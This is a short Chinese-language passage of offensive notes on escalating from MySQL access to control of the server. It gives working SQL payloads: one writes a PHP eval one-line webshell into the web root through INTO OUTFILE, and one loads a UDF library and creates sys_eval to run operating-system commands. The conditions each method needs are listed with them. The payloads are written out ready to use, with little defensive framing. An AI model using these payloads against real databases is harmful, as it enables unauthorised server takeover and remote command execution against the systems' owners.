## 方式1：FILE权限 + 写Webshell（前提：拥有`FILE`权限，secure_file_priv不为NULL）
条件：
1. mysql 用户拥有 `FILE` 权限
2. `secure_file_priv` 允许导出文件
3. 知道网站物理路径，MySQL进程对目录有写入权限

```sql
-- 写php一句话到web目录
select '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php';
```
拿到webshell后进一步获取服务器操作系统权限。

> 限制：MySQL8 默认禁用FILE，secure_file_priv 默认限制路径。

## 方式2：UDF自定义函数提权（UDF注入）
条件：
1. mysql 用户拥有 `CREATE FUNCTION` 权限
2. 可以上传 udf 动态库（libudf.dll / libudf.so）到mysql插件目录 `plugin_dir`
3. 版本匹配，操作系统架构匹配

步骤：
1. 将udf库写入mysql插件目录
2. 创建自定义函数
```sql
create function sys_eval returns string soname 'libudf.so';
```
3. 调用函数执行系统命令
```sql
select sys_eval('whoami');
```
通过执行系统命令获取服务器权限。



